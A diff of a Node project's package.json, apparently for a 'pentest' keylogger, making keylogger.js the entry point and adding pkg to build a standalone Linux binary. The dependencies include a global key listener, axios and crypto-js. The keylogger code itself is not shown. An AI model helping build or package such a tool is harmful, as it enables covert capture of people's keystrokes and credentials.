@@ -1,9 +1,9 @@
 {
   "name": "pentest",
   "version": "1.0.0",
-  "main": "index.js",
+  "main": "keylogger.js",
   "scripts": {
-    "start": "nodemon .\\keylogger.js",
+    "start": "node keylogger.js",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "keywords": [],
@@ -14,6 +14,13 @@
     "axios": "^1.10.0",
     "crypto-js": "^4.2.0",
     "node-global-key-listener": "^0.3.0",
-    "nodemon": "^3.1.10"
-  }
+    "nodemon": "^3.1.10",
+    "pkg": "^5.8.1"
+  },
+  "pkg": {
+    "targets": [
+      "node18-linux-x64"
+    ]
+  },
+  "bin": "keylogger.js"
 }
